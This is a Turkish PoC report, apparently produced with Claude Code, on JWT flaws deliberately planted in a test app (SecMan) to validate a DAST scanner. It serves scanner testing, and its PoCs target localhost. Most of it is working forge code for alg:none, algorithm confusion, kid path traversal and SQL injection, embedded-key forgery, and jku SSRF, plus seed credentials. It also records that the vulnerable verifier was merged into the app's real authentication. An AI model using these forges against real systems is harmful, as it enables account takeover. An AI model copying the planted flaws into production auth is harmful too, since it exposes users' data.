# SecMan — Bilerek Yerleştirilmiş JWT Zafiyetleri · PoC Raporu

| | |
|---|---|
| **Hedef** | (SecMan), Go 1.22 / Gin |
| **Amaç** | crAPI'de **izole edilemeyen / tarayıcının kaçırdığı** JWT zafiyetlerini, canlı ve **izole doğrulanabilir** bir hedefte bilerek üretmek |
| **Branch** | `vuln` |
| **Durum** | Uygulandı + birim testleriyle forge vektörleri kanıtlandı (`go test ./services/vulnjwt/` → PASS). **2026-09-13: AUTH MERGE uygulandı (aşağı bkz.)** |

> ⚠️ **UYARI:** `services/vulnjwt` paketi **kasıtlı olarak zafiyetlidir**. Yalnız DAST worker'ının
> JWT test setini doğrulamak içindir. Production'a gitmemelidir.

> 🔀 **MERGE GÜNCELLEMESİ (2026-09-13):** Ayrı `/api/v1/vuln/*` realm'i **kaldırıldı**. `/vuln/`
> yolu "bilerek zafiyetli uygulama" olduğunu ele verdiği ve worker'ın standart `/api/v1/users/login`
> credential'ıyla tespit yapılabilmesi için, zafiyetli JWT katmanı doğrudan **gerçek SecMan
> `/api/v1/users/*` auth'u** yapıldı. Endpoint eşlemesi:
> `POST /vuln/login → POST /users/login` (artık email+parola, gerçek DB user) ·
> `GET /vuln/profile → GET /users/profile` (id/sub BOLA) ·
> `GET /vuln/admin → GET /users/all` (role priv-esc) ·
> `GET /vuln/tenant → GET /users/tenant` (tenant BOLA) · `/.well-known/jwks.json` (aynı).
> `middlewares.Authentication` artık tüm korumalı yüzeyi `vulnjwt.VerifyVulnerable` ile doğrular →
> alg:none/algorithm-confusion/kid/embedded/jku + exp/aud/iss-yok zafiyetleri **app genelinde**.
> `controller/vulnJWTController.go` ve `routes/vuln_routes.go` **silindi**; mantık
> `authController.Login` + `middlewares/authMiddleware.go` + `controller/userController.go`
> (`GetAllUsersVuln`/`GetTenantUsersVuln`) içine taşındı. Ayrıntı, kök-neden ve canlı kanıt: Worker
> `design_docs/Secman_JWT_Coverage_GapAnalysis.md` (not: MasterPlan'da atıfta bulunulan "§15.9"
> yazılmamıştır — güncel kaynak Gap Analysis dokümanıdır). Aşağıdaki §1–§3 tarihsel referanstır;
> zafiyet mantığı (`services/vulnjwt/verify.go` VULN-01..09) aynıdır, yalnız erişim yüzeyi ve giriş
> noktası değişti.

---

## 0.0 Bunlar Neden GERÇEK Zafiyet, Neden False-Positive DEĞİL — 401/200 Mantığı

> Bu bölümü konuyu hiç bilmeyen biri de yanlış anlamamalı. Aşağıdaki her PoC iki isteklik bir
> **kontrollü deney**dir: bir **negative control** (kontrol grubu) ve bir **forge** (deney grubu).

**Kurulum (izolasyon garantisi).** Sunucu, imzayı GERÇEKTEN doğrular. Bunu iki referansla ispatlıyoruz:

- **Baseline** — gerçek RS256 imzalı token → **200** (normal erişim).
- **Negative control** — aynı token ama imzanın son baytları bozuk → **401**.

`200` (baseline) + `401` (bozuk imza) ikilisi tek başına şunu kanıtlar: **sunucu imza doğrulamasını
AKTİF olarak yapıyor.** Yani rastgele/bozuk bir token içeri giremez.

**Kanıt (forge).** Her zafiyet için, imzayı FARKLI bir kök nedenle atlayan bir forge token gönderiyoruz.
Eğer o forge **200** dönüyorsa, sunucu "aktif olarak doğruladığı" imzayı **bu forge için atlamış**
demektir. Bu, tanım gereği bir imza/doğrulama bypass'ıdır.

**En sık yapılan yanlış okuma.** "401 gördüm, demek ki başarısız / zafiyet yok" — **YANLIŞ.**
Bu deneyde **401 = pozitif değil, NEGATİF kanıttır** (kontrol grubu): sunucunun sağlam çalıştığını
gösterir. Zafiyetin kanıtı **forge'un 200'ü**dür. Yani:

| Gözlem | Anlamı |
|---|---|
| Baseline **200** | Erişim referansı |
| Bozuk-imza control **401** | Sunucu imzayı doğruluyor (kontrol grubu — sağlıklı) |
| Forge **200** | **ZAFİYET**: doğrulama bu forge tarafından atlandı (pozitif kanıt) |
| Forge **401** | O forge işe yaramadı — bulgu YOK (false-positive üretilmez) |

Bir forge'un 200 alması "sunucu her şeyi kabul ediyor" (auth yok) anlamına da GELMEZ: bunu control
zaten eler — control 401 alıyorsa sunucu keyfî token kabul etmiyor, yalnız o SPESİFİK forge tekniği
doğrulamayı deliyor. Bu ayrım her PoC'de "**Neden FP değil?**" başlığıyla tek tek yazılmıştır.

**Kesinlik etiketleri.** Her PoC ya `KESİN (forge 200 gözlendi)` ya da
`PASİF (yalnız decode; sunucu davranışı doğrulanmadı)` olarak işaretlidir. Pasif olan abartılmaz.

> **Anahtar rotasyonu uyarısı (tekrar-üretim için).** SecMan RSA anahtarını **her container
> başlangıcında yeniden üretir** (`services/vulnjwt/keystore.go:InitKeys`). Bu nedenle aşağıdaki
> curl akışları token'ı **canlı `login` + canlı `jwks.json`'dan türetir** — elle kopyalanmış eski
> bir token restart sonrası 401 alır (bu bir zafiyet değil, beklenen davranıştır).

---

## 0. Neden Bu Tasarım — crAPI Blind-Spot'larının Karşılığı

Master plan'daki (`JWT_DAST_FalsePositive_MasterPlan.md`) izolasyon matrisine göre crAPI'de:

| crAPI vektörü | crAPI verdict | SecMan'de karşılığı |
|---|---|---|
| Algorithm Confusion (RS→HS) | **FALSE-POSITIVE** (izole çalışmadı — servisler HS256'yı tümden reddediyordu) | **VULN-03** — izole çalışıyor |
| KID path traversal / injection | **FALSE-POSITIVE** (dev/null+AA== hepsi 401) | **VULN-04a/b/c** — izole çalışıyor |
| JKU misuse | **GERÇEK ama scanner BLIND-SPOT** (OOB kapalıydı) | **VULN-06** — izole çalışıyor |
| Embedded-key (jwk/x5c) | crAPI'de dashboard no-verification gölgesinde | **VULN-05** — izole çalışıyor |

**İzolasyon garantisi:** Baseline gerçek RS256 imzayla **200**, negative control (bozuk imza) **401** döner.
Yani sunucu imzayı *gerçekten* doğrular; her forge vektörü bu doğrulamayı ayrı bir kök nedenle atlar —
crAPI dashboard'undaki "blanket no-verification" gölgesi burada YOKTUR.

---

## 1. Zafiyet Haritası — Hangi Zafiyet, Hangi Dosya, Kaçıncı Satır

| # | Zafiyet | crAPI test # | Dosya | Satır | Etiket |
|---|---------|:---:|-------|:---:|--------|
| 1 | **alg:none** — imza segmenti hiç kontrol edilmez | 1 | `services/vulnjwt/verify.go` | **104-107** | `VULN-01` |
| 2 | **alg allow-list yok** — `alg` header'ına güven | 1-6 | `services/vulnjwt/verify.go` | **80-82** | `VULN-02` |
| 3 | **Algorithm Confusion** (RSA pub key = HMAC secret, 4 varyant) | 2 | `services/vulnjwt/verify.go` | **159-167** + `algConfusionSecrets()` **200-213** | `VULN-03` |
| 3b | **Weak HMAC secret** (sözlük) | 1 | `services/vulnjwt/verify.go` | **169-175** | `VULN-03b` |
| 4a | **kid path traversal** → boş anahtar | 4 | `services/vulnjwt/keystore.go` | **92-98** | `VULN-04a` |
| 4b | **kid SQL injection** → saldırgan anahtarı | 4 | `services/vulnjwt/keystore.go` | **100-114** | `VULN-04b` |
| 4c | **kid-as-key** — kid değeri = HMAC anahtarı | 4 | `services/vulnjwt/keystore.go` | **116-118** | `VULN-04c` |
| 5 | **Embedded-key forgery** (header.jwk / x5c) | 5 | `services/vulnjwt/verify.go` | **129-148** (`rsaFromJWK` **219-240**, `rsaFromX5C` **242-262**) | `VULN-05` |
| 6 | **jku / x5u SSRF + attacker key** | 15 / 3 | `services/vulnjwt/verify.go` | **109-127** (`fetchRSAFromJKU` **264-279**, `fetchRSAFromX5U` **281-298**) | `VULN-06` |
| 7 | **exp / nbf / iat doğrulaması yok** | 9 | `services/vulnjwt/verify.go` | **189-191** (üretim: `sign.go` **27**) | `VULN-07` |
| 8 | **aud / iss doğrulaması yok** | 8 | `services/vulnjwt/verify.go` | **189-191** | `VULN-08` |
| 9 | **typ / cty tip doğrulaması yok** (nested JWT unwrap) | 6 | `services/vulnjwt/verify.go` | **92-100** | `VULN-09` |
| 10 | **Privilege escalation** — role claim'ine güven | 10 | `controller/vulnJWTController.go` | **110-113** | `VULN-10` |
| 12 | **Subject confusion → BOLA** — sub claim = nesne anahtarı | 12 | `controller/vulnJWTController.go` | **97-102** | `VULN-12` |
| 13 | **Tenant isolation bypass → BOLA** | 13 | `controller/vulnJWTController.go` | **123-130** | `VULN-13` |
| 16 | **Passive audit** — PII payload'da + jti yok + 7 gün ömür | 16 | `services/vulnjwt/sign.go` | **22, 27, 28** | `VULN-16` |

---

## 2. Endpoint Yüzeyi (MERGE sonrası — güncel)

Tümü `http://localhost:8070` (secman-nginx) üzerinden. Ayrı `/vuln/*` realm'i yoktur; korumalı
tüm yüzey `middlewares.Authentication` → `vulnjwt.VerifyVulnerable` ile doğrulanır.

| Method | Path | İşlev |
|---|---|---|
| POST | `/api/v1/users/login` | Baseline: gerçek DB kimlik doğrulaması (email+parola), yanıt **zafiyetli RS256** token |
| GET | `/.well-known/jwks.json` | RS256 public key (algorithm-confusion / jku kaynağı) |
| GET | `/api/v1/users/profile` | Subject/id BOLA (token `id` claim'ine göre profil — VULN-12) |
| GET | `/api/v1/users/all` | Privilege escalation (token `role` claim'ine göre — VULN-10) |
| GET | `/api/v1/users/tenant` | Tenant isolation BOLA (token `tenant_id` claim'ine göre — VULN-13) |
| * | diğer korumalı yüzey (admin/zap/semgrep/dashboard) | Aynı kırık JWT auth'u → alg:none vb. app genelinde |

Gerçek kimlikler (seed `99-lutenix-profiles.sql`, 3 ayrı şirket): `secman-admin@lutenix.local /
SecmanAdmin!123` (admin), `secman-user1@lutenix.local / SecmanUser1!` (user), `secman-user2@lutenix.local
/ SecmanUser2!` (user). BOLA hedef değerleri (id/tenant_id) crawl/differential ile öğrenilir (guessable
ID gerektirmez).

---

## 3. PoC — Kopyala-Çalıştır (curl / python)

> Tüm örnekler `http://localhost:8070` içindir. Seed login hesapları
> `secman-target/99-lutenix-profiles.sql` ile gelir (admin id `7a1e5c2d-…5b6a`, user1 `…5b6b`,
> user2 `…5b6c`; parolalar `SecmanAdmin!123` / `SecmanUser1!` / `SecmanUser2!`). Gerçek token
> değerleri çıktı örneklerinde `<REDACTED>` ile maskelenmiştir; yapı korunmuştur.

### 3.0 Bootstrap — Baseline (200) + Negative Control (401) = izolasyon kanıtı
```bash
B=http://localhost:8070

# (1) Gerçek giriş -> zafiyetli RS256 token (kid=secman-baseline-2024, id/role/tenant_id taşır)
TOK=$(curl -s $B/api/v1/users/login -H 'Content-Type: application/json' \
      -d '{"email":"secman-user1@lutenix.local","password":"SecmanUser1!"}' | jq -r .token)
#   TOK = eyJhbGciOiJSUzI1NiIsImtpZCI6InNlY21hbi1iYXNlbGluZS0yMDI0Ii...<REDACTED>

# (2) BASELINE -> 200 (kendi profili)
curl -s -o /dev/null -w "baseline      = %{http_code}\n" $B/api/v1/users/profile -H "Authorization: Bearer $TOK"

# (3) NEGATIVE CONTROL -> imzanın son 4 baytını boz -> 401
curl -s -o /dev/null -w "wrong-sig ctrl = %{http_code}\n" $B/api/v1/users/profile -H "Authorization: Bearer ${TOK%????}AAAA"
```
Beklenen: `baseline = 200`, `wrong-sig ctrl = 401`. **Bu ikili, sunucunun imzayı AKTİF doğruladığını
kanıtlar** (kontrol grubu sağlıklı). Aşağıdaki her forge bu 401'i 200'e çevirir = doğrulama atlandı.

Ortak python yardımcıları (aşağıdaki PoC'ler bunu kullanır):
```python
# forgelib.py — b64url + HS/none/RS imza yardımcıları
import json,base64,hmac,hashlib
def b64u(b): return base64.urlsafe_b64encode(b if isinstance(b,bytes) else b.encode()).rstrip(b"=").decode()
def jwt_none(claims, header=None):
    h=header or {"alg":"none","typ":"JWT"}
    return b64u(json.dumps(h,separators=(',',':')))+"."+b64u(json.dumps(claims,separators=(',',':')))+"."
def jwt_hs(claims, secret, header):
    si=b64u(json.dumps(header,separators=(',',':')))+"."+b64u(json.dumps(claims,separators=(',',':')))
    return si+"."+b64u(hmac.new(secret if isinstance(secret,bytes) else secret.encode(),si.encode(),hashlib.sha256).digest())
```

---

### 3.1 VULN-01 · alg:none — `KESİN (forge 200 gözlendi)`
```bash
# id = user1 (geçerli UUID; middleware uuid.Parse(id) şart koşar), role admin'e çekilir
FORGE=$(python -c 'import forgelib as f; print(f.jwt_none({"id":"7a1e5c2d-0b3f-4d6e-9a8c-1f2e3d4c5b6b","sub":"secman-user1@lutenix.local","role":"admin"}))')
curl -s -o /dev/null -w "alg:none = %{http_code}\n" $B/api/v1/users/profile -H "Authorization: Bearer $FORGE"   # -> 200
```
**Neden gerçek zafiyet, neden FP değil?** Bootstrap'ta bozuk imza **401** aldı → sunucu imzayı
doğruluyor. Bu forge'da imza segmenti tamamen BOŞ (`alg:none`) ve yine **200** döndü → sunucu, aktif
olarak doğruladığı imzayı `alg:none` gördüğünde atlıyor. Kaynak: `verify.go` `case EqualFold(alg,"none")`.

### 3.2 VULN-03 · Algorithm Confusion (RS→HS) — `KESİN (forge 200 gözlendi)`
```python
# forgelib + canlı jwks -> RSA public key baytları HMAC secret olarak
import forgelib as f, json, base64, urllib.request
from cryptography.hazmat.primitives.asymmetric import rsa
from cryptography.hazmat.primitives import serialization
k=json.load(urllib.request.urlopen("http://localhost:8070/.well-known/jwks.json"))["keys"][0]
d=lambda s: base64.urlsafe_b64decode(s+"="*(-len(s)%4))
pub=rsa.RSAPublicNumbers(int.from_bytes(d(k["e"]),"big"),int.from_bytes(d(k["n"]),"big")).public_key()
der=pub.public_bytes(serialization.Encoding.DER, serialization.PublicFormat.SubjectPublicKeyInfo)
claims={"id":"7a1e5c2d-0b3f-4d6e-9a8c-1f2e3d4c5b6b","role":"admin","tenant_id":"28480d43-b30b-45b6-b320-42288698e679"}
tok=f.jwt_hs(claims, der, {"alg":"HS256","typ":"JWT"})   # NOT: kid YOK (kid varsa sunucu kid-dalına gider)
print(tok)
```
```bash
curl -s -o /dev/null -w "algconf = %{http_code}\n" $B/api/v1/users/all -H "Authorization: Bearer $TOK"   # -> 200
```
**Neden FP değil?** Kullanılan HMAC secret'ı **herkese açık** RSA public key'in baytlarıdır — özel
anahtar YOK. Bozuk-imza kontrolü 401 iken bu 200 → sunucu `alg` header'ını otoriter sayıp asimetrik
anahtarı simetrik secret gibi kullanıyor (`verify.go` HS256 dalı + `algConfusionSecrets()`).
> **Önemli tuzak:** Token'a `kid` KOYMAYIN — `verify.go`'da kid dalı HS256 confusion dalından ÖNCEdir;
> kid varsa istek kid-türetme yoluna gider (VULN-04), confusion'ı test etmez. (Worker'ın
> `algorithm_confusion` mutator'ı da bilerek kid'siz üretir.)

### 3.3 VULN-04a/b/c · kid Injection — `KESİN (forge 200 gözlendi)`
```python
import forgelib as f
claims={"id":"7a1e5c2d-0b3f-4d6e-9a8c-1f2e3d4c5b6b","role":"admin"}
# 4a empty-key: kid path -> boş anahtar
print(f.jwt_hs(claims, b"", {"alg":"HS256","kid":"../../../../dev/null"}))
# 4b SQLi: UNION SELECT 'attacker_secret' -> secret = attacker_secret
print(f.jwt_hs(claims, "attacker_secret", {"alg":"HS256","kid":"x' UNION SELECT 'attacker_secret'-- -"}))
# 4c kid-as-key: store'da yoksa kid değeri anahtar olur
print(f.jwt_hs(claims, "lutenix-kid", {"alg":"HS256","kid":"lutenix-kid"}))
```
Üçü de `/api/v1/users/all` → **200**. **Neden FP değil?** Her varyantta saldırgan HMAC anahtarını
KENDİSİ belirliyor (boş / SQLi sabiti / kid'in kendisi); sunucu bu anahtarla doğrulayıp kabul ediyor.
Bozuk-imza kontrolü 401 iken bunlar 200 → `keystore.go:resolveKidKey` saldırgan-kontrollü anahtar üretiyor.

### 3.4 VULN-05 · Embedded-Key Forgery (jwk / x5c) — `KESİN (forge 200 gözlendi)`
```python
import forgelib as f, json, base64
from cryptography.hazmat.primitives.asymmetric import rsa, padding
from cryptography.hazmat.primitives import hashes, serialization
priv=rsa.generate_private_key(public_exponent=65537,key_size=2048); pub=priv.public_key().public_numbers()
b64u=lambda n: base64.urlsafe_b64encode(n.to_bytes((n.bit_length()+7)//8,"big")).rstrip(b"=").decode()
jwk={"kty":"RSA","n":b64u(pub.n),"e":b64u(pub.e)}
hdr={"alg":"RS256","jwk":jwk}                                   # doğrulama anahtarı token'ın İÇİNDE
si=(f.b64u(json.dumps(hdr,separators=(',',':')))+"."+f.b64u(json.dumps({"id":"7a1e5c2d-0b3f-4d6e-9a8c-1f2e3d4c5b6b","role":"admin"},separators=(',',':'))))
sig=priv.sign(si.encode(), padding.PKCS1v15(), hashes.SHA256())  # SALDIRGANIN özel anahtarı
print(si+"."+base64.urlsafe_b64encode(sig).rstrip(b"=").decode())
```
`/api/v1/users/all` → **200**. **Neden FP değil?** İmza tamamen geçerli — ama saldırganın ÜRETTİĞİ
anahtar çiftiyle; sunucu doğrulama anahtarını token'ın kendi `jwk` header'ından alıyor (`verify.go`
`case header["jwk"]`). Bozuk-imza kontrolü 401 iken bu 200 → gömülü-anahtara güven. (x5c için aynı
mantık, self-signed sertifika ile.)

### 3.5 VULN-06 · jku / x5u SSRF + Attacker Key — `PASİF/OOB (out-of-band doğrulama gerekir)`
```python
import forgelib as f, json, base64
# header.jku = saldırgan-kontrollü OOB URL; sunucu bunu allow-list olmadan fetch eder
hdr={"alg":"RS256","jku":"http://<OOB-CANARY-HOST>/jwks.json"}
# ... (attacker RSA ile imzalanır; §3.4'teki gibi)
```
Sunucu `verify.go:fetchRSAFromJKU` ile URL'i **allow-list olmadan** çeker → OOB collaborator'da
DNS/HTTP callback = **blind SSRF**. **Kesinlik:** SSRF kanıtı callback'e bağlıdır (yanıt kodu değil);
bir OOB collaborator olmadan `KESİN` işaretlenemez. Saldırgan kendi JWKS'ini sunarsa imza da kabul
edilir (imza-bypass). `x5u` için `verify.go:fetchRSAFromX5U`.

### 3.6 VULN-07 (exp/nbf/iat) & VULN-08 (aud/iss) — `KESİN (forge 200 gözlendi)`
Bu forge'lar **gerçek imza** taşımalı (izolasyon: alg:none, "claim doğrulanmıyor"u "imza
doğrulanmıyor"dan ayıramaz). §3.2'deki confusion secret'ıyla (`der`) imzalayın:
```python
import forgelib as f, time
base={"id":"7a1e5c2d-0b3f-4d6e-9a8c-1f2e3d4c5b6b","sub":"secman-user1@lutenix.local"}
print(f.jwt_hs({**base,"exp":int(time.time())-3600}, der, {"alg":"HS256","typ":"JWT"}))          # VULN-07 süresi dolmuş
print(f.jwt_hs({**base,"aud":"başka-servis","iss":"https://saldirgan"}, der, {"alg":"HS256"}))    # VULN-08 yanlış aud/iss
```
`/api/v1/users/profile` → **200**. **Neden FP değil?** Token GEÇERLİ imzalı (confusion secret'ı)
ve bozuk-imza kontrolü 401 → sunucu imzayı doğruluyor; buna rağmen süresi geçmiş / yanlış aud/iss
kabul ediliyor → imza-sonrası **hiçbir claim doğrulaması yok** (`verify.go` `default` sonrası not).

### 3.7 VULN-10 · Privilege Escalation (role claim) — `KESİN (forge 200 gözlendi)`
```bash
# alg:none + role=admin (harvest/confusion anahtarından bağımsız)
FORGE=$(python -c 'import forgelib as f; print(f.jwt_none({"id":"7a1e5c2d-0b3f-4d6e-9a8c-1f2e3d4c5b6b","role":"admin"}))')
curl -s -o /dev/null -w "priv-esc /users/all = %{http_code}\n" $B/api/v1/users/all -H "Authorization: Bearer $FORGE"  # -> 200
```
**Neden FP değil?** Baseline düşük-yetkili token yalnız kendi verisini görür; `role:admin`'e
yükseltilmiş forge tüm kullanıcıları döndürüyor (yetki DELTA'sı). Bozuk-imza kontrolü 401 iken bu
200 → sunucu yetki kararını token'ın `role` claim'inden alıyor (`userController` role kontrolü).

### 3.8 VULN-12/13 · BOLA (subject / tenant confusion) — `KESİN (mekanizma), victim değeri gerekir`
```bash
# sub/id -> kurban; tenant_id -> kurban tenant
python -c 'import forgelib as f; print(f.jwt_none({"id":"<VICTIM-UUID>","sub":"<VICTIM-EMAIL>","role":"user"}))'   # /users/profile -> kurban PII
python -c 'import forgelib as f; print(f.jwt_none({"id":"7a1e5c2d-0b3f-4d6e-9a8c-1f2e3d4c5b6b","tenant_id":"<VICTIM-TENANT>"}))'  # /users/tenant -> kurban tenant
```
**Neden FP değil?** Kendi (baseline) token'ıyla kurban verisi GÖRÜNMEZ; yalnız `id/sub`/`tenant_id`
kurbana çekilince görünür → gerçek BOLA (plain-BOLA değil). **Not:** worker tarafında canlı bulgu
için kurban değerinin differential'dan gelmesi gerekir (`{{victim_id}}` carrier — bkz. Worker
`design_docs/Secman_JWT_Coverage_GapAnalysis.md` F7).

### 3.9 VULN-16 · Passive Decode Audit — `PASİF (yalnız decode; sunucu davranışı doğrulanmadı)`
```bash
echo "$TOK" | cut -d. -f2 | tr '_-' '/+' | base64 -d 2>/dev/null | jq .
#   -> {"email":"...","exp":..., "iat":...}  (jti YOK; exp-iat = 7 gün)
```
**Neden gerçek (ama pasif) bulgu?** Token imzalı ama şifresiz: PII (`email`) payload'da taşınıyor,
`jti` yok (replay/revocation koruması yok), ömür 7 gün (aşırı). Bu tespit tek başına token'ın
içeriğine dayanır — sunucuya forge gönderilmez, bu yüzden `KESİN` değil `PASİF` etiketlidir.

---

## 4. Doğrulama Kanıtı (birim testi)

```
`verify_test.go` şunları kanıtlar: baseline **kabul**, negative control **ret**, ve
VULN-01, 03, 03b, 04a/b/c, 05, 07 forge vektörlerinin **hepsi kabul** ediliyor.

---

## 5. Eklenen/Değişen Dosyalar

| Dosya | Rol |
|---|---|
| `services/vulnjwt/keystore.go` | RSA anahtar, JWKS, kid→anahtar (path/SQLi/kid-as-key) |
| `services/vulnjwt/verify.go` | Zafiyetli doğrulayıcı (VULN-01..09) |
| `services/vulnjwt/sign.go` | Baseline RS256 token üretici (VULN-07/16) |
| `services/vulnjwt/verify_test.go` | 8 forge vektörünün kanıt testi |
| `controller/vulnJWTController.go` | Endpoint'ler + auth middleware (VULN-10/12/13) |
| `routes/vuln_routes.go` | Route kaydı |
| `main.go` | `vulnjwt.InitKeys()` + `routes.VulnJWTRoutes(router)` |

🤖 Generated with [Claude Code](https://claude.com/claude-code)
